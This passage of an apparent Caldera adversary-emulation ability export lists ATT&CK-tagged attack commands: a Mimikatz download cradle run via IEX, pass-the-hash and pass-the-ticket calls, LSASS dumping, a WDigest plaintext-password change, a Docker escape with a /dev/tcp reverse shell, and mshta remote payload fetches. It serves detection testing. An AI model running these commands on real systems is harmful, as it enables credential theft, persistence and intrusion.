"target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "90c76bd616efee6d7c98dc6c1dcc6e99", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Mimikatz - Cradlecraft PsSendKeys", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Similar to PTH, but attacking Kerberos\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1550.003\\bin\\x64\\mimikatz.exe \"kerberos::ptt None\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Use Alternate Authentication Material: Pass the Ticket", "ability_id": "fd2611bbbe81dfbe6c282799fea56737", "technique_id": "T1550.003", "tactic": "multiple", "requirements": [], "name": "Mimikatz Kerberos Ticket Attack", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Use Alternate Authentication Material: Pass the Hash", "ability_id": "ed508e035ded2716b4622276bc3da403", "technique_id": "T1550.002", "tactic": "multiple", "requirements": [], "name": "Mimikatz Pass the Hash", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Custom GO credential dumper using minidumpwritedump", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["totallylegit.exe"], "parsers": [], "cleanup": ["if (Test-Path \"C:\\Users\\Public\\creds.dmp\") {\n  rm \"C:\\Users\\Public\\creds.dmp\" -Force;\n};"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping", "ability_id": "3c647015-ab0a-496a-8847-6ab173cd2b22", "technique_id": "T1003", "tactic": "credential-access", "requirements": [{"relationship_match": [{"source": "host.process.id"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "MiniDumpWriteDump (Spooky)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["e1adde_mirrorblast_emulation.xlsm"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"; New-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null; & '.\\Excel 2016.lnk' e1adde_mirrorblast_emulation.xlsm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "7d45fed6428da84d356357a1ad79bfe4", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Mirror Blast Emulation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" && sc start Fax", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "50598e403dbf17cf341e4e08a9c5b0d1", "technique_id": "T1543.003", "tactic": "multiple", "requirements": [], "name": "Modify Fax service to run PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "0bacba34be276136d07781079e912090", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Modify Registry of Current User Profile - cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "ad3da5b8a3ced63d5b6374b7aa6adac5", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Modify Registry of Local Machine - cmd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"$env:TEMP\\lsass_lib.dll\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: LSASS Driver", "ability_id": "c627649c38266ebb83e477796312be3c", "technique_id": "T1547.008", "tactic": "multiple", "requirements": [], "name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset ssh_authorized_keys"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "root"}]}], "cleanup": ["unset ssh_authorized_keys"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "SSH Authorized Keys", "ability_id": "0c67915b076b2b044cedb3fe979f4c7e", "technique_id": "T1098.004", "tactic": "persistence", "requirements": [], "name": "Modify SSH Authorized Keys", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SecurityPackages = Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += \"not-a-ssp\"; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Security Support Provider", "ability_id": "7675653e29a9ca33083f7d66d87bec13", "technique_id": "T1547.005", "tactic": "multiple", "requirements": [], "name": "Modify SSP configuration in registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "8ef0e743e8f073af665288aaf631a71a", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Modify registry to store logon credentials", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["5fad3e_T1553.005.iso", "5fad3e_T1553.005.iso"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Dismount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\" | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Mount-DiskImage -ImagePath \"5fad3e_T1553.005.iso\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "ability_id": "78024e1da21332fdcad99a6f93170d41", "technique_id": "T1553.005", "tactic": "defense-evasion", "requirements": [], "name": "Mount ISO image", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": true, "description": "Mount a windows share", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.share_mounted", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_share", "target": "", "source": "remote.host.fqdn"}]}], "cleanup": ["net use \\\\#{remote.host.fqdn}\\C$ /delete"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: SMB/Windows Admin Shares", "ability_id": "aa6ec4dd-db09-4925-b9b9-43adeb154686", "technique_id": "T1021.002", "tactic": "lateral-movement", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_share"}], "module": "plugins.stockpile.app.requirements.not_exists"}, {"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_admin", "target": "domain.user.name"}], "module": "plugins.stockpile.app.requirements.req_like"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "isAccessibleFrom"}], "module": "plugins.stockpile.app.requirements.reachable"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}], "name": "Mount Share", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["0f959a_FeelTheBurn.iso", "0f959a_FeelTheBurn.iso"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Dismount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" | Out-Null; Stop-process -name \"hello\" -Force -ErrorAction ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$keep = Mount-DiskImage -ImagePath \"0f959a_FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item \"$($driveLetter):\\hello.exe\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass", "ability_id": "f5e00f183d185e4306b355d3c3e5d8f3", "technique_id": "T1553.005", "tactic": "defense-evasion", "requirements": [], "name": "Mount an ISO image and run executable from the ISO", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This technique abuses privileged Docker containers to mount the host's filesystem and then create a cron job to launch a reverse shell as the host's superuser.\nThe container running the test needs be privileged.  It may take up to a minute for this to run due to how often crond triggers a job.\nDev note: the echo to create cron_filename is broken up to prevent localized execution of hostname and id by Powershell. \n", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /mnt/T1611.002/etc/cron.d/T1611_002; umount /mnt/T1611.002; rmdir /mnt/T1611.002"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "if [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi; echo -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" > /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"(hostname) \" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo -n \"$\" >> /mnt/T1611.002/etc/cron.d/T1611_002; echo \"(id)\\\" >& /dev/tcp/`ifconfig eth0 | grep inet | awk '{print $2}'`/4444 0>&1'\" >> /mnt/T1611.002/etc/cron.d/T1611_002; netcat -l -p 4444 2>&1", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Escape to Host", "ability_id": "44b27e447e3d05284f704f66b79dead7", "technique_id": "T1611", "tactic": "privilege-escalation", "requirements": [], "name": "Mount host filesystem to escape privileged Docker container", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy powershell to non-standard location and perform triage commands", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "PowerShell", "ability_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d", "technique_id": "T1059.001", "tactic": "defense-evasion", "requirements": [], "name": "Move Powershell & triage", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"; $var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; start-sleep -s 15; stop-process -name \"calculator\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "337c07ce279b747827679ffb226e5d9c", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Mshta Executes Remote HTML Application (HTA)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "826e5c82d8f99a94ae96472dca89de03", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "e5ca57d20f8608e2acc0808b8dd8726c", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Mshta executes VBScript to execute malicious command", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "54a7ac8fc8991511de9993983d3d3215", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Mshta used to Execute PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "6ff9659bac38f7c1f64b7f302309c2f3", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute Local MSI file with an embedded DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "728053b8e56bf06f4d19ceac871fcb6c", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute Local MSI file with an embedded EXE", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "fc919667b226b75eafa70b29f8f5e4f7", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute Local MSI file with embedded JScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /q /#{action} \"#{msi_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "b0f287b8da3b5ad8619f8b7102cf4ee7", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute Local MSI file with embedded VBScript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /q /i \"#{msi_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "dff11c1e8340bbae0245b866917889af", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute Remote MSI file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{msi_exe} /y \"#{dll_payload}\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Msiexec", "ability_id": "a514c64de95ade525a68116e442af1bd", "technique_id": "T1218.007", "tactic": "defense-evasion", "requirements": [], "name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the 